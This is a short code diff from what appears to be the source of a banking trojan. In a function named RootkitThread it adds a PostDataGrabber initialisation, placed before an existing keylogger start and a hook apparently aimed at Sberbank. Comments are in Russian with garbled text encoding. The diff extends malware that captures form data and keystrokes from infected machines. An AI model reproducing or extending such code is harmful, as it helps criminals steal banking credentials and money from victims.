@@ -15,7 +15,7 @@
 #include "BotEvents.h"
 //#include "CmdLine.h"
 #include "BotCore.h"
-
+#include "PostDataGrabber.h"
 
 #include "Modules.h"
 
@@ -432,10 +432,15 @@ DWORD WINAPI RootkitThread( LPVOID lpData, LPVOID, LPVOID )
 
     RTKDBG("rotkit", "«апущен процесс %s", AppName);
 
+	//инициализируем систему оповещени€ о пост данных, должен быть запущен раньше кейлогера
+	#ifdef PostDataGrabberH
+		PostDataGrabber::Init();
+	#endif
 
 	#ifdef KeyLogSystemsH
 		StartKeyLogger(AppName);
 	#endif
+
 	#ifdef SBERH
 		HookSber();
 	#endif 
